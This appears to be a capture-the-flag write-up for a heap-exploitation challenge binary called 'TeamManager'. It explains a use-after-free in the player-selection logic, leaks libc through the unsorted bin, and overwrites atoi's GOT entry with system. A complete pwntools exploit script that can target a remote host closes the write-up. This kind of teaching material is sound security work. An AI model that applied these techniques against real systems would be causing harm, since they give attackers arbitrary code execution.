### _Binary Review_

```
RELRO           STACK CANARY      NX            PIE         
Partial RELRO   Canary found      NX enabled    No PIE
```

```
Welcome to your TeamManager (TM)!
0.- Exit
1.- Add player
2.- Remove player
3.- Select player
4.- Edit player
5.- Show player
6.- Show team
Your choice:
```

After messing around with the binary's functionality, the conclusions are the following:

* We get to create players in order to form a team. Those players are nothing more than C structs ofcourse. Each player has the following struct attributes.

```c
struct player {
     int32_t attack_pts;
     int32_t defense_pts;
     int32_t speed;
     int32_t precision;
     char *name;
}    
```

* We get to show / dump / edit the team's or the player's info.

* We get to delete a player from the team.

* Note that in order to do the two aforementioned actions, we need to first **select** the player by entering an idex. Really important info to remember for later.


### _Reverse Engineering_

#### .: Player Allocation :.

* Check if there's an available entry in the global array for allocation.

* If the answer to the previous check is yes, ask the user for the player's info.

* Once the user is done, store the new allocated player's address inside the global array.

#### .: Player Selection :.

```asm
00401c8b  mov     eax, dword [rbp-0x14]      ; index
00401c8e  mov     rax, qword [rax*8+0x603180]
00401c96  mov     qword [rel selected], rax  ; store selected pointer into the variable
```

#### .: Show Player :.

```asm
/* Global variable holding a player pointer */
             [...]
004020f2  mov     rax, qword [rel selected] 
004020f9  mov     rdi, rax
004020fc  call    show_player_func
             [...]
```

### _UAF Vulnerability_

The player's name is free'd first and then the player's chunk itself. However, the **selected** variable isn't zeroed out, which we can abuse to leak the main_arena pointer of a smallbin chunk.

```asm
             [...]
/* index */
00401b9c  mov     eax, dword [rbp-0x1c]
/* player struct pointer */
00401b9f  mov     rax, qword [rax*8+0x603180] 
00401ba7  mov     qword [rbp-0x18], rax
00401bab  mov     eax, dword [rbp-0x1c]
/* Mitigate double-free, good shit */
00401bae  mov     qword [rax*8+0x603180], 0x0 
00401bba  mov     rax, qword [rbp-0x18]
/* player's name pointer */
00401bbe  mov     rax, qword [rax+0x10]      
00401bc2  mov     rdi, rax
00401bc5  call    free
/* player's chunk */
00401bca  mov     rax, qword [rbp-0x18]   
00401bce  mov     rdi, rax
00401bd1  call    free
             [...]
```

### _Exploit Visualization_


```python
def alloc(name, attack = 1, 
		  defense = 2, speed = 3, precision = 4):

	p.recvuntil('choice: ')
	p.sendline('1')

	p.recvuntil('name: ')
	p.sendline(name)

	p.recvuntil('points: ')
	p.sendline(str(attack))

	p.recvuntil('points: ')
	p.sendline(str(defense))

	p.recvuntil('speed: ')
	p.sendline(str(speed))

	p.recvuntil('precision: ')
	p.sendline(str(precision))

	return

def pwn():

    alloc('A'*0x60)

```

```
(gdb) x/80gx 0x604000
      0x604000:	0x0000000000000000	0x0000000000000021 <-- player 0 
      0x604010:	0x0000000200000001	0x0000000400000003
      0x604020:	0x0000000000604030	0x0000000000000071
      0x604030:	0x4141414141414141	0x4141414141414141
      0x604040:	0x4141414141414141	0x4141414141414141
      0x604050:	0x4141414141414141	0x4141414141414141
      0x604060:	0x4141414141414141	0x4141414141414141
      0x604070:	0x4141414141414141	0x4141414141414141
      0x604080:	0x4141414141414141	0x4141414141414141
      0x604090:	0x0000000000000000	0x0000000000020f71
``` 

```python
alloc('B'*0x60)
```

```
(gdb) x/80gx 0x604000
0x604000:	0x0000000000000000	0x0000000000000021  <-- player 0
0x604010:	0x0000000200000001	0x0000000400000003
0x604020:	0x0000000000604030	0x0000000000000071
0x604030:	0x4141414141414141	0x4141414141414141
0x604040:	0x4141414141414141	0x4141414141414141
0x604050:	0x4141414141414141	0x4141414141414141
0x604060:	0x4141414141414141	0x4141414141414141
0x604070:	0x4141414141414141	0x4141414141414141
0x604080:	0x4141414141414141	0x4141414141414141
0x604090:	0x0000000000000000	0x0000000000000021 <-- player 1
0x6040a0:	0x0000000200000001	0x0000000400000003
0x6040b0:	0x00000000006040c0	0x0000000000000071
0x6040c0:	0x4242424242424242	0x4242424242424242
0x6040d0:	0x4242424242424242	0x4242424242424242
0x6040e0:	0x4242424242424242	0x4242424242424242
0x6040f0:	0x4242424242424242	0x4242424242424242
0x604100:	0x4242424242424242	0x4242424242424242
0x604110:	0x4242424242424242	0x4242424242424242
0x604120:	0x0000000000000000	0x0000000000020ee1 
```


```python
alloc('C'*0x80)
alloc('D'*0x80)
```

```
(gdb) x/90gx 0x604000
0x604000:	0x0000000000000000	0x0000000000000021 <-- player 0
0x604010:	0x0000000200000001	0x0000000400000003
0x604020:	0x0000000000604030	0x0000000000000071
0x604030:	0x4141414141414141	0x4141414141414141
0x604040:	0x4141414141414141	0x4141414141414141
0x604050:	0x4141414141414141	0x4141414141414141
0x604060:	0x4141414141414141	0x4141414141414141
0x604070:	0x4141414141414141	0x4141414141414141
0x604080:	0x4141414141414141	0x4141414141414141
0x604090:	0x0000000000000000	0x0000000000000021 <-- player 1
0x6040a0:	0x0000000200000001	0x0000000400000003
0x6040b0:	0x00000000006040c0	0x0000000000000071
0x6040c0:	0x4242424242424242	0x4242424242424242
0x6040d0:	0x4242424242424242	0x4242424242424242
0x6040e0:	0x4242424242424242	0x4242424242424242
0x6040f0:	0x4242424242424242	0x4242424242424242
0x604100:	0x4242424242424242	0x4242424242424242
0x604110:	0x4242424242424242	0x4242424242424242
0x604120:	0x0000000000000000	0x0000000000000021 <-- player 2
0x604130:	0x0000000200000001	0x0000000400000003
0x604140:	0x0000000000604150	0x0000000000000091
0x604150:	0x4343434343434343	0x4343434343434343
0x604160:	0x4343434343434343	0x4343434343434343
0x604170:	0x4343434343434343	0x4343434343434343
0x604180:	0x4343434343434343	0x4343434343434343
0x604190:	0x4343434343434343	0x4343434343434343
0x6041a0:	0x4343434343434343	0x4343434343434343
0x6041b0:	0x4343434343434343	0x4343434343434343
0x6041c0:	0x4343434343434343	0x4343434343434343
0x6041d0:	0x0000000000000000	0x0000000000000021 <-- player 3
0x6041e0:	0x0000000200000001	0x0000000400000003
0x6041f0:	0x0000000000604200	0x0000000000000091
0x604200:	0x4444444444444444	0x4444444444444444
0x604210:	0x4444444444444444	0x4444444444444444
0x604220:	0x4444444444444444	0x4444444444444444
0x604230:	0x4444444444444444	0x4444444444444444
0x604240:	0x4444444444444444	0x4444444444444444
0x604250:	0x4444444444444444	0x4444444444444444
0x604260:	0x4444444444444444	0x4444444444444444
0x604270:	0x4444444444444444	0x4444444444444444
0x604280:	0x0000000000000000	0x0000000000020d81
```


```python
select(2)

free(2)
```

```
(gdb) x/80gx 0x604000
0x604000:	0x0000000000000000	0x0000000000000021 <-- player 0 [in use]
0x604010:	0x0000000200000001	0x0000000400000003
0x604020:	0x0000000000604030	0x0000000000000071
0x604030:	0x4141414141414141	0x4141414141414141
0x604040:	0x4141414141414141	0x4141414141414141
0x604050:	0x4141414141414141	0x4141414141414141
0x604060:	0x4141414141414141	0x4141414141414141
0x604070:	0x4141414141414141	0x4141414141414141
0x604080:	0x4141414141414141	0x4141414141414141
0x604090:	0x0000000000000000	0x0000000000000021 <-- player 1 [in use]
0x6040a0:	0x0000000200000001	0x0000000400000003
0x6040b0:	0x00000000006040c0	0x0000000000000071
0x6040c0:	0x4242424242424242	0x4242424242424242
0x6040d0:	0x4242424242424242	0x4242424242424242
0x6040e0:	0x4242424242424242	0x4242424242424242
0x6040f0:	0x4242424242424242	0x4242424242424242
0x604100:	0x4242424242424242	0x4242424242424242
0x604110:	0x4242424242424242	0x4242424242424242
0x604120:	0x0000000000000000	0x0000000000000021 <-- player 2 [free]
0x604130:	0x0000000000000000	0x0000000400000003
0x604140:	0x0000000000604150	0x0000000000000091
0x604150:	0x00007ffff7dd37b8	0x00007ffff7dd37b8 
0x604160:	0x4343434343434343	0x4343434343434343
0x604170:	0x4343434343434343	0x4343434343434343
0x604180:	0x4343434343434343	0x4343434343434343
0x604190:	0x4343434343434343	0x4343434343434343
0x6041a0:	0x4343434343434343	0x4343434343434343
0x6041b0:	0x4343434343434343	0x4343434343434343
0x6041c0:	0x4343434343434343	0x4343434343434343
```

Player 2's name chunk is free'd and populated with main arena's libc pointer since it's in a circular double-linked list.

#### _Libc Leak_


```python
# The 'selected' array contains the 3rd player object
# We are abusing the UAF vuln to leak libc
# show_player just checks if the 'selected' array is empty
# if it's not, it will print the value of the player's object
# without checking if it's actually free'd or not
show()

p.recvuntil('Name: ')

leak        = u64(p.recv(6).ljust(8, '\x00'))
libc        = leak - 0x3c17b8
system      = libc + 0x46590

log.info("Leak:   0x{:x}".format(leak))
log.info("Libc:   0x{:x}".format(libc))
log.info("system: 0x{:x}".format(system))
```

```
[*] Leak:   0x7ffff7dd37b8
[*] Libc:   0x7ffff7a12000
[*] system: 0x7ffff7a58590
```


### _Pwning Time_

Now the question is, how do we get arbitrary code execution? Instead of exploiting the binary's logic this time, we'll exploit both the binary's and heap's logic.

```python
# Consolidate with top chunk
free(3) 
```

```
0x604120:	0x0000000000000000	0x00000000000000b1 <-- player 2 [free]
0x604130:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
0x604140:	0x0000000000604150	0x0000000000000091
0x604150:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
0x604160:	0x4343434343434343	0x4343434343434343
0x604170:	0x4343434343434343	0x4343434343434343
0x604180:	0x4343434343434343	0x4343434343434343
0x604190:	0x4343434343434343	0x4343434343434343
0x6041a0:	0x4343434343434343	0x4343434343434343
0x6041b0:	0x4343434343434343	0x4343434343434343
0x6041c0:	0x4343434343434343	0x4343434343434343
0x6041d0:	0x00000000000000b0	0x0000000000000020 <-- player 3 [free]
0x6041e0:	0x0000000000000000	0x0000000400000003
0x6041f0:	0x0000000000604200	0x0000000000020e11 <-- top chunk
```

Malloc doesn't like fragmentation, so what it did was consolidate any adjacent free chunks, update the size values of those chunks according to their coalesced sizes and lastly update the top chunk's size value to a higher one since chunks were free'd and that means more free space to allocate.

```
(0x20)     fastbin[0]: 0x6041d0 --> 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x6041f0 (size : 0x20e10) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x604120 (size : 0xb0)
```

Now consider the following. What's going to happen on the next allocation? 

* Remember, each player object has a default size of `0x20` and a pointer pointing to an arbitrary size chunk depending on the length of our input.

* When we allocate a new chunk, malloc will check the corresponding bin list according to the size request and check if there's an equivalent free chunk of the same size to serve back to the user. That's the so called **first-fit behavior**. Keep in mind, deletion and addition in fastbins happens from the **HEAD** of the list. In other words, we should be expecting the player's info to get stored at `0x6041d0` since it's a free chunk of fastbin size and meets the `0x20` requirement.

* The unsorted bin holds the address `0x604120`. That's the address of the player 2's chunk. That was not the same address as before the **free(3)**. That's because malloc consolidated the adjacent free chunks and they became one entire free chunk, so it had to update the address. The code corresponding to the adjacency check is this:

```c
/* consolidate backward */
if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
}
```

* No matter what the size of the name we enter (as long as it's not bigger than the chunk that is currently in the unsorted bin list, `0xb0` in our case), we should get back the address `0x604120` in order to store the name. If the size is less than `0xb0`, the given chunk will get split since there's no need to give back more than what we ask for, right?

* However, `0x604120` is the address of player 2's chunk! Meaning, we can overwrite its data with our surgically picked name payload and mess with its structure. Remember, player 2 is still in the **selected** variable, so we can still print its content, edit it etc. What if we were able to overwrite the pointer to the original name, with a pointer of our choice (a GOT entry) and call the function `edit` on it? We would be able to redirect code execution. That's an abritrary write primitive! 

```python
# Overwrite 3rd player's (index 2) name pointer with atoi
# in order to edit it with system's address
alloc('Z'*8 * 2 + p64(atoi_got))

edit(p64(system))
```

The function's GOT entry I chose to overwrite was `atoi`. The reason behind this is that `atoi` receives a pointer to our input in order to convert it back to an integer. What if `atoi` is `system` though? What's going to happen if we provide `sh` as an argument to what it's supposed to be `atoi`? Bingo ;)

```
0x604120:	0x0000000000000000	0x0000000000000021 <-- new player's name [old player 2]
0x604130:	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a
0x604140:	0x0000000000603110	0x0000000000000091
0x604150:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
0x604160:	0x4343434343434343	0x4343434343434343
0x604170:	0x4343434343434343	0x4343434343434343
0x604180:	0x4343434343434343	0x4343434343434343
0x604190:	0x4343434343434343	0x4343434343434343
0x6041a0:	0x4343434343434343	0x4343434343434343
0x6041b0:	0x4343434343434343	0x4343434343434343
0x6041c0:	0x4343434343434343	0x4343434343434343
0x6041d0:	0x0000000000000090	0x0000000000000020 <-- new allocated player
0x6041e0:	0x0000000200000001	0x0000000400000003
0x6041f0:	0x0000000000604130
```

Game over, player 2's original name pointer has been overwritten with `atoi's` GOT entry. Once we request to edit its name, we'll overwrite `atoi's` entry with `system's` address.

---

### _Exploit_

```python
from pwn import *

atoi_got = 0x603110

def alloc(name, attack = 1, 
		  defense = 2, speed = 3, precision = 4):

	p.recvuntil('choice: ')
	p.sendline('1')

	p.recvuntil('name: ')
	p.sendline(name)

	p.recvuntil('points: ')
	p.sendline(str(attack))

	p.recvuntil('points: ')
	p.sendline(str(defense))

	p.recvuntil('speed: ')
	p.sendline(str(speed))

	p.recvuntil('precision: ')
	p.sendline(str(precision))

	return

def edit(name):

	p.recvuntil('choice: ')
	p.sendline('4')

	p.recvuntil('choice: ')
	p.sendline('1')

	p.recvuntil('name: ')
	p.sendline(name)

	p.recvuntil('choice: ')
	p.sendline('sh')

	return

def select(idx):

	p.recvuntil('choice: ')
	p.sendline('3')

	p.recvuntil('index: ')
	p.sendline(str(idx))

	return

def free(idx):

	p.recvuntil('choice: ')
	p.sendline('2')

	p.recvuntil('index: ')
	p.sendline(str(idx))

	return

def show():

	p.recvuntil('choice: ')
	p.sendline('5')

	return

def pwn():

	alloc('A'*0x60)
	alloc('B'*0x60)
	alloc('C'*0x80)
	alloc('D'*0x80)

	select(2)

	free(2)

	# The 'selected' array contains the 3rd player object
	# We are abusing the UAF vuln to leak libc
	# show_player just checks if the 'selected' array is empty
	# if it's not, it will print the value of the player's object
	# without checking if it's actually free'd or not
	show()

	p.recvuntil('Name: ')

	leak        = u64(p.recv(6).ljust(8, '\x00'))
	libc        = leak - 0x3c17b8
	system      = libc + 0x46590

	log.info("Leak:   0x{:x}".format(leak))
	log.info("Libc:   0x{:x}".format(libc))
	log.info("system: 0x{:x}".format(system))

	log.info("Overwriting atoi with system")

	# Consolidate with top chunk
	free(3) 

	# Overwrite 3rd player's (index 2) name pointer with atoi
	# in order to edit it with system's address
	alloc('Z'*8 * 2 + p64(atoi_got))

	edit(p64(system))

	p.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        p = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        p = process('./main.elf')
        pause()
        pwn()
```

~ Peace!
